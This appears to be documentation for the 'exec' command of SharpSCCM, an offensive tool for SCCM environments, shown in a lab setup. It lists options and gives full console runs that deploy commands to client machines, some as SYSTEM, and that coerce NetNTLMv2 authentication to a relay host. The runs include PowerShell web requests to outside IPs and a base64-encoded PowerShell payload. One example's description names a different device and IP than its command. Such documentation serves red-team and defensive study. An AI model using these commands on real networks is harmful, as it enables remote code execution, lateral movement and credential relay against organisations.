---
description: exec documentation
title: exec
---

# Using the "exec" Command

This documentation was last updated on 7/3/24 by Chris Thompson (@_Mayyhem). Please refer to the output of the `--help` option for each command for the most up-to-date usage information.

### Description
Execute a command, binary, or script on a client or request NTLM authentication from a client
    
### Requirements
Permitted security roles:
  - Full Administrator
  - Application Administrator

### Usage
```
SharpSCCM exec [options]

Options:
  -d, --device <device>                    The ResourceName of the device to execute a command, binary, or script on or 
                                           receive NTLM authentication from
  -i, --collection-id <collection-id>      The CollectionID of the device or user collection to execute a command,
                                           binary, or script on or receive NTLM authentication from
  -n, --collection-name <collection-name>  The name of the device or user collection to execute a command, binary, or
                                           script on or receive NTLM authentication from
  -p, --path <path>                        The command or the UNC path of the binary/script to execute (e.g.,
                                           "powershell iwr http://192.168.57.130/a", "C:\Windows\System32\calc.exe",
                                           "\\site-server.domain.com\Sources$\my.exe")
  -r, --relay-server <relay-server>        The NetBIOS name, IP address, or if WebClient is enabled on the targeted
                                           client device, the IP address and port (e.g., "192.168.1.1@8080") of the
                                           relay/capture server (default: the machine running SharpSCCM)
  -rid, --resource-id <resource-id>        The unique ResourceID of the device or user to execute a command, binary, or 
                                           script on or receive NTLM authentication from
  -s, --run-as-system                      Execute the application in the SYSTEM context (default: logged on user)
  -t, --collection-type <device|user>      The type of the collection ("device" or "user")
  -u, --user <user>                        The UniqueUserName of the user to execute an application as or receive NTLM
                                           authentication from (e.g., "APERTURE\cave.johnson")
  -sc, --site-code <site-code>             The three character site code (e.g., "PS1") (default: the site code of the
                                           client running SharpSCCM)
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to connect to
                                           (default: the current management point of the client running SharpSCCM)
  -w, --wait-time <wait-time>              The time (in seconds) to wait for the deployment to execute before cleaning
                                           up (default: 300) [default: 300]
  -dir, --working-dir <working-dir>        The working directory to execute a command, binary, or script from
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```
### Examples
Execute `calc.exe` on the `CAVE-JOHNSON-PC` device in the context of the currently logged on user:
```
.\SharpSCCM.exe exec -d CAVE-JOHNSON-PC -p calc.exe

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Found 0 collections matching the specified
[+] Creating new device collection: Devices_b91c22dd-e01e-446e-ab36-efb0637233a3
[+] Successfully created collection
[+] Found resource named CAVE-JOHNSON-PC with ResourceID 16777274
[+] Added CAVE-JOHNSON-PC 16777274 to Devices_b91c22dd-e01e-446e-ab36-efb0637233a3
[+] Waiting for new collection member to become available...
[+] New collection member is not available yet... trying again in 5 seconds
[+] Successfully added CAVE-JOHNSON-PC 16777274 to Devices_b91c22dd-e01e-446e-ab36-efb0637233a3
[+] Creating new application: Application_0425ea20-be6c-4da9-a935-1b0653ef80cf
[+] Application path: calc.exe
[+] Updated application to run in the context of the logged on user
[+] Successfully created application
[+] Creating new deployment of Application_0425ea20-be6c-4da9-a935-1b0653ef80cf to Devices_b91c22dd-e01e-446e-ab36-efb0637233a3 (PS10005E)
[+] Found the Application_0425ea20-be6c-4da9-a935-1b0653ef80cf application
[+] Successfully created deployment of Application_0425ea20-be6c-4da9-a935-1b0653ef80cf to Devices_b91c22dd-e01e-446e-ab36-efb0637233a3 (PS10005E)
[+] New deployment name: Application_0425ea20-be6c-4da9-a935-1b0653ef80cf_PS10005E_Install
[+] Waiting for new deployment to become available...
[+] New deployment is available, waiting 30 seconds for updated policy to become available
[+] Forcing all members of Devices_b91c22dd-e01e-446e-ab36-efb0637233a3 (PS10005E) to retrieve machine policy and execute any new applications available
[+] Waiting 1 minute for execution to complete...
[+] Cleaning up
[+] Found the Application_0425ea20-be6c-4da9-a935-1b0653ef80cf_PS10005E_Install deployment
[+] Deleted the Application_0425ea20-be6c-4da9-a935-1b0653ef80cf_PS10005E_Install deployment
[+] Querying for deployments of Application_0425ea20-be6c-4da9-a935-1b0653ef80cf_PS10005E_Install
[+] No remaining deployments named Application_0425ea20-be6c-4da9-a935-1b0653ef80cf_PS10005E_Install were found
[+] Found the Application_0425ea20-be6c-4da9-a935-1b0653ef80cf application
[+] Deleted the Application_0425ea20-be6c-4da9-a935-1b0653ef80cf application
[+] Querying for applications named Application_0425ea20-be6c-4da9-a935-1b0653ef80cf
[+] No remaining applications named Application_0425ea20-be6c-4da9-a935-1b0653ef80cf were found
[+] Deleted the Devices_b91c22dd-e01e-446e-ab36-efb0637233a3 collection (PS10005E)
[+] Querying for the Devices_b91c22dd-e01e-446e-ab36-efb0637233a3 collection (PS10005E)
[+] Found 0 collections matching the specified CollectionID
[+] No remaining collections named Devices_b91c22dd-e01e-446e-ab36-efb0637233a3 with CollectionID PS10005E were found
[+] Completed execution in 00:02:17.1775661
```

Find the device where `APERTURE\cave.johnson` is the primary user and coerce NetNTLMv2 authentication from the user to `192.168.57.130`:
```
.\SharpSCCM.exe exec -u APERTURE\cave.johnson -r 192.168.57.130

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Found 0 collections matching the specified
[+] Creating new user collection: Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47
[+] Successfully created collection
[+] Found resource named APERTURE\cave.johnson (Cave Johnson) with ResourceID 2063597575
[+] Added APERTURE\cave.johnson (Cave Johnson) 2063597575 to Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47
[+] Waiting for new collection member to become available...
[+] Successfully added APERTURE\cave.johnson (Cave Johnson) 2063597575 to Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47
[+] Creating new application: Application_4130f5e5-06c8-4631-a20c-7bd78611502d
[+] Application path: \\192.168.57.130\C$
[+] Updated application to run in the context of the logged on user
[+] Successfully created application
[+] Creating new deployment of Application_4130f5e5-06c8-4631-a20c-7bd78611502d to Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 (PS10005F)
[+] Found the Application_4130f5e5-06c8-4631-a20c-7bd78611502d application
[+] Successfully created deployment of Application_4130f5e5-06c8-4631-a20c-7bd78611502d to Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 (PS10005F)
[+] New deployment name: Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install
[+] Waiting for new deployment to become available...
[+] New deployment is available, waiting 30 seconds for updated policy to become available
[+] APERTURE\cave.johnson is the primary user of CAVE-JOHNSON-PC
[+] Forcing CAVE-JOHNSON-PC (16777274) to retrieve user policy and execute any new applications available for APERTURE\cave.johnson
[+] Found 0 collections matching the specified
[+] Creating new device collection: Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08
[+] Successfully created collection
[+] Found resource named CAVE-JOHNSON-PC with ResourceID 16777274
[+] Added CAVE-JOHNSON-PC 16777274 to Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08
[+] Waiting for new collection member to become available...
[+] New collection member is not available yet... trying again in 5 seconds
[+] Successfully added CAVE-JOHNSON-PC 16777274 to Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08
[+] Creating new application: Application_a594de98-c2bb-4531-a56e-caef0c78633f
[+] Application path: powershell -EncodedCommand JABDAHUAcgByAGUAbgB0AFUAcwBlAHIAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgAFUAcwBlAHIAUwBJAEQALAAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAIABGAFIATwBNACAAQwBDAE0AXwBVAHMAZQByAEwAbwBnAG8AbgBFAHYAZQBuAHQAcwAgAFcASABFAFIARQAgAEwAbwBnAG8AZgBmAFQAaQBtAGUAPQBOAFUATABMACIAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAIgByAG8AbwB0AFwAYwBjAG0AIgA7ACAAJABVAHMAZQByAEkARAA9ACQAQwB1AHIAcgBlAG4AdABVAHMAZQByAC4AVQBzAGUAcgBTAEkARAA7ACAAJABVAHMAZQByAEkARAA9ACQAVQBzAGUAcgBJAEQALgByAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAXwAiACkAOwAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwAgAD0AIAAiAHsAMAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAyADYAfQAiACwAIgB7ADAAMAAwADAAMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAAMAAwADAAMAAwADAAMgA3AH0AIgA7ACAARgBvAHIARQBhAGMAaAAgACgAJABNAGUAcwBzAGEAZwBlAEkARAAgAGkAbgAgACQATQBlAHMAcwBhAGcAZQBJAEQAcwApACAAewAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAgAD0AIAAoAFsAdwBtAGkAXQAiAHIAbwBvAHQAXABjAGMAbQBcAFAAbwBsAGkAYwB5AFwAJABVAHMAZQByAEkARABcAEEAYwB0AHUAYQBsAEMAbwBuAGYAaQBnADoAQwBDAE0AXwBTAGMAaABlAGQAdQBsAGUAcgBfAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAEkARAA9ACQATQBlAHMAcwBhAGcAZQBJAEQAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAHIAaQBnAGcAZQByAHMAIAA9ACAAQAAoACIAUwBpAG0AcABsAGUASQBuAHQAZQByAHYAYQBsADsATQBpAG4AdQB0AGUAcwA9ADEAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIAAkAFMAYwBoAGUAZAB1AGwAZQBkAE0AZQBzAHMAYQBnAGUALgBUAGEAcgBnAGUAdABFAG4AZABwAG8AaQBuAHQAIAA9ACAAIgBkAGkAcgBlAGMAdAA6AFAAbwBsAGkAYwB5AEEAZwBlAG4AdABfAFIAZQBxAHUAZQBzAHQAQQBzAHMAaQBnAG4AbQBlAG4AdABzACIAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQA7ACAAJABTAGMAaABlAGQAdQBsAGUAZABNAGUAcwBzAGEAZwBlAC4AVAByAGkAZwBnAGUAcgBzACAAPQAgAEAAKAAiAFMAaQBtAHAAbABlAEkAbgB0AGUAcgB2AGEAbAA7AE0AaQBuAHUAdABlAHMAPQAxADUAOwBNAGEAeABSAGEAbgBkAG8AbQBEAGUAbABhAHkATQBpAG4AdQB0AGUAcwA9ADAAIgApADsAIABzAGwAZQBlAHAAIAAzADAAOwAgACQAUwBjAGgAZQBkAHUAbABlAGQATQBlAHMAcwBhAGcAZQAuAFAAdQB0ACgAKQB9AA==
[+] Updated application to run as SYSTEM
[+] Successfully created application
[+] Creating new deployment of Application_a594de98-c2bb-4531-a56e-caef0c78633f to Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 (PS100060)
[+] Found the Application_a594de98-c2bb-4531-a56e-caef0c78633f application
[+] Successfully created deployment of Application_a594de98-c2bb-4531-a56e-caef0c78633f to Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 (PS100060)
[+] New deployment name: Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install
[+] Waiting for new deployment to become available...
[+] New deployment is available, waiting 30 seconds for updated policy to become available
[+] Forcing all members of Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 (PS100060) to retrieve machine policy and execute any new applications available
[+] Waiting 1 minute for execution to complete...
[+] Cleaning up
[+] Found the Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install deployment
[+] Deleted the Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install deployment
[+] Querying for deployments of Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install
[+] No remaining deployments named Application_a594de98-c2bb-4531-a56e-caef0c78633f_PS100060_Install were found
[+] Found the Application_a594de98-c2bb-4531-a56e-caef0c78633f application
[+] Deleted the Application_a594de98-c2bb-4531-a56e-caef0c78633f application
[+] Querying for applications named Application_a594de98-c2bb-4531-a56e-caef0c78633f
[+] No remaining applications named Application_a594de98-c2bb-4531-a56e-caef0c78633f were found
[+] Deleted the Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 collection (PS100060)
[+] Querying for the Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 collection (PS100060)
[+] Found 0 collections matching the specified CollectionID
[+] No remaining collections named Devices_c63d1ec2-fa28-4888-a3fb-77e1c7af7f08 with CollectionID PS100060 were found
[+] Cleaning up
[+] Found the Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install deployment
[+] Deleted the Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install deployment
[+] Querying for deployments of Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install
[+] No remaining deployments named Application_4130f5e5-06c8-4631-a20c-7bd78611502d_PS10005F_Install were found
[+] Found the Application_4130f5e5-06c8-4631-a20c-7bd78611502d application
[+] Deleted the Application_4130f5e5-06c8-4631-a20c-7bd78611502d application
[+] Querying for applications named Application_4130f5e5-06c8-4631-a20c-7bd78611502d
[+] No remaining applications named Application_4130f5e5-06c8-4631-a20c-7bd78611502d were found
[+] Deleted the Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 collection (PS10005F)
[+] Querying for the Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 collection (PS10005F)
[+] Found 0 collections matching the specified CollectionID
[+] No remaining collections named Users_ab7ecbd6-7273-49c7-9f27-d30709ee5c47 with CollectionID PS10005F were found
[+] Completed execution in 00:02:45.4183430
```

Execute `powershell iwr http://192.168.57.100` on the `CAVE-JOHNSON-PC` device:
```
.\SharpSCCM.exe exec -d GLaDOS -p "powershell iwr http://192.168.57.131"

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Found 0 collections matching the specified
[+] Creating new device collection: Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
[+] Successfully created collection
[+] Found resource named GLADOS with ResourceID 16777281
[+] Added GLADOS 16777281 to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
[+] Waiting for new collection member to become available...
[+] New collection member is not available yet... trying again in 5 seconds
[+] Successfully added GLADOS 16777281 to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6
[+] Creating new application: Application_7223fc98-8669-4ae5-b5ad-7876386cc07a
[+] Application path: powershell iwr http://192.168.57.131
[+] Updated application to run in the context of the logged on user
[+] Successfully created application
[+] Creating new deployment of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061)
[+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
[+] Successfully created deployment of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a to Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061)
[+] New deployment name: Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install
[+] Waiting for new deployment to become available...
[+] New deployment is available, waiting 30 seconds for updated policy to become available
[+] Forcing all members of Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 (PS100061) to retrieve machine policy and execute any new applications available
[+] Waiting 1 minute for execution to complete...
[+] Cleaning up
[+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install deployment
[+] Deleted the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install deployment
[+] Querying for deployments of Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install
[+] No remaining deployments named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a_PS100061_Install were found
[+] Found the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
[+] Deleted the Application_7223fc98-8669-4ae5-b5ad-7876386cc07a application
[+] Querying for applications named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a
[+] No remaining applications named Application_7223fc98-8669-4ae5-b5ad-7876386cc07a were found
[+] Deleted the Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 collection (PS100061)
[+] Querying for the Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 collection (PS100061)
[+] Found 0 collections matching the specified CollectionID
[+] No remaining collections named Devices_62ffc8e0-07e0-4fb1-b108-591291052fd6 with CollectionID PS100061 were found
[+] Completed execution in 00:01:54.5997840
```

### References
- https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867